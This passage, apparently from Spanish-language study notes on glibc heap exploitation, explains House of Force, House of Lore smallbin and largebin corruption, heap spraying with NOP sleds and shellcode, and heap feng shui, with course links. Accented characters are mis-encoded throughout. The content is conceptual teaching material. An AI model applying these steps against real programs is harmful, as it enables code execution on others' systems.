0xbffff224 - 0x080c2788 = 3086207644.

As√≠ se guardar√° en av->top el valor alterado y el pr√≥ximo malloc apuntar√° al EIP y lo podr√° sobreescribir.

Es importante saber que el size del nuevo trozo wilderness sea m√°s grande que la solicitud realizada por el √∫ltimo malloc(). Es decir, si el wilderness est√° apuntando a \&EIP-8, el size quedar√° justo en el campo EBP del stack.

**The House of Lore**

**Corrupci√≥n SmallBin**

Los trozos liberados se introducen en el bin en funci√≥n de su tama√±o. Pero antes de introduciros se guardan en unsorted bins. Un trozo es liberado no se mete inmediatamente en su bin sino que se queda en unsorted bins. A continuaci√≥n, si se reserva un nuevo trozo y el anterior liberado le puede servir se lo devuelve, pero si se reserva m√°s grande, el trozo liberado en unsorted bins se mete en su bin adecuado.

Para alcanzar el c√≥digo vulnerable la solicitud de memora deber√° ser mayor a av->max\_fast (72normalmente) y menos a MIN\_LARGE\_SIZE (512).

Si en los bin hay un trozo del tama√±o adecuado a lo que se pide se devuelve ese despu√©s de desenlazarlo:

bck = victim->bk; Apunta al trozo anterior, es la √∫nica info que podemos alterar.

bin->bk = bck; El pen√∫ltimo trozo pasa a ser el √∫ltimo, en caso de que bck apunte al stack al siguiente trozo reservado se le dar√° esta direcci√≥n

bck->fd = bin; Se cierra la lista haciendo que este apunte a bin

Se necesita:
Reservar dos malloc, de modo que el primero pueda ser desbordado despu√©s de liberar y reservar un malloc superior al segundo.

El malloc asignado con la direcci√≥n elegida por el atacante debe ser controlado por √©l.

El objetivo es hacer un overflow en un heap que tenga un trozo liberado y en su bin, para alterar su puntero bk. Si el trozo modificado se convierte en el primero de la lista de bin y se reserva, se enga√±ar√° al bin para que crea que el siguiente trozo est√° en una direcci√≥n falsa. Luego, al reservar otro trozo, el atacante podr√° escribir en la direcci√≥n deseada.

Para explotar la vulnerabilidad, se deben seguir estos pasos: reservar el trozo vulnerable, reservar el trozo a modificar, liberar el segundo trozo, reservar un trozo m√°s grande que el segundo, modificar el trozo vulnerable, reservar un trozo del mismo tama√±o que el modificado y reservar un segundo trozo del mismo tama√±o que apuntar√° a la direcci√≥n elegida.

Para protegerse de este ataque, se realiza una comprobaci√≥n para verificar que el trozo no es falso: se verifica si bck->fd apunta a la v√≠ctima. Para superar esta protecci√≥n, el atacante debe poder escribir la direcci√≥n de la v√≠ctima en la direcci√≥n adecuada.

**Corrupci√≥n LargeBin**

Se requieren los mismos requisitos que antes, pero los trozos reservados deben ser mayores a 512. Se debe modificar el tama√±o del trozo de forma que size - nb sea < MINSIZE.

**Heap Spraying**

Consiste en reservar toda la memoria posible para heaps y rellenarlos con nops seguidos de una shellcode. Se intenta saltar a la direcci√≥n 0x0c0c0c0c, esperando que haya nops all√≠.

**Heap Feng Shui**

Se trata de sembrar la memoria con reservas y liberaciones para dejar trozos reservados entre trozos libres, con el objetivo de desbordar un buffer en uno de los huecos.

## Cursos interesantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referencias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)
